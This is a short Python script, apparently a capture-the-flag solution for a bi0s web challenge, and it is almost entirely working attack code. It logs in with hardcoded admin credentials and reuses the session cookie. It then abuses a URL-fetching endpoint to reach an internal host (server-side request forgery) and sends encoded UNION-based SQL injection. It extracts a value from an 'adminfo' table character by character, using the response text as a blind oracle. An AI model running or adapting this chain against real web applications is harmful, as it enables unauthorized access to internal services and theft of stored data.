import requests
import string

url="http://web.challenge.bi0s.in:6007/login"
url1="http://web.challenge.bi0s.in:6007/dev_test"

def login():
  r = requests.post(url,data={'username':'admin','password':'1337'}, allow_redirects = False)
  newcookie= r.cookies['session']
  return newcookie

i=0
flag = ''
newcookie=login()

while True:
  i = i+1
  for char in '/'+string.ascii_letters+string.digits+'-.':
    print(flag+char,end='\r')
    data = {'url':f"http://192.168.48.2?part1=%252527&part2=1,name from adminfo where name like 0x{(flag+char).encode('utf-8').hex()}25 Union select 1"}
    r = requests.post(url=url1,data=data,cookies={"session":newcookie})
    print(r.text)
    if 'Not' in r.text:
      flag += char
      print(flag)
      break


